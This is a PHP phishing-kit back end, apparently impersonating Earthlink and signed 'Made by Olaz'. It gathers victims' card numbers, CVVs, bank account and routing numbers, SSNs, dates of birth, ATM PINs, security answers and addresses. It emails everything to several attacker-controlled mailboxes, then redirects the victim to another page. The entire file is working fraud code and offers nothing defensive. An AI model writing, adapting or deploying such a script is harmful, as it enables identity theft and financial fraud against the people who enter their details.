<?php

include '../blocker.php';
$ip = getenv("REMOTE_ADDR");

$message .= "card no: ".$_POST['55']."\n";
$message .= "month: ".$_POST['2']."\n";
$message .= "year: ".$_POST['3']."\n";
$message .= "cvv: ".$_POST['cvv']."\n";
$message .= "account: ".$_POST['a']."\n";
$message .= "routing: ".$_POST['b']."\n";
$message .= "full name: ".$_POST['5']."\n";
$message .= "mmn: ".$_POST['6']."\n";
$message .= "ssn: ".$_POST['7']."\n";
$message .= "dob: ".$_POST['8']."\n";
$message .= "car: ".$_POST['9']."\n";
$message .= "Skool city: ".$_POST['10']."\n";
$message .= "pets name: ".$_POST['11']."\n";
$message .= "phone: ".$_POST['12']."\n";
$message .= "Atm: ".$_POST['13']."\n";
$message .= "Dl: ".$_POST['14']."\n";
$message .= "Address: ".$_POST['15']."\n";
$message .= "Address 2: ".$_POST['16']."\n";
$message .= "City: ".$_POST['17']."\n";
$message .= "Sate: ".$_POST['18']."\n";
$message .= "zipcode: ".$_POST['19']."\n";
$message .= "IP: ".$ip."\n";
$message .= "--------Made by Olaz------\n";

$recipient = "banger.nine@yandex.ru, nine.banger@my.com,ninebanger44@gmail.com,@gmail.com, ninebanger@outlook.com,";
$subject = "OLAZ EARTHLINK FULLZ RESULTZ";
$headers = "From: ";
$headers .= $_POST['eMailAdd']."n";
$headers .= "Olaz-Fullz";
     mail("$cc", "yahoo Info", $message);
if (mail($recipient,$subject,$message,$headers))
       {
           header("Location: klo.htm");

       }
else
           {
        echo "ERROR! Please go back and try again.";
         }

?>
        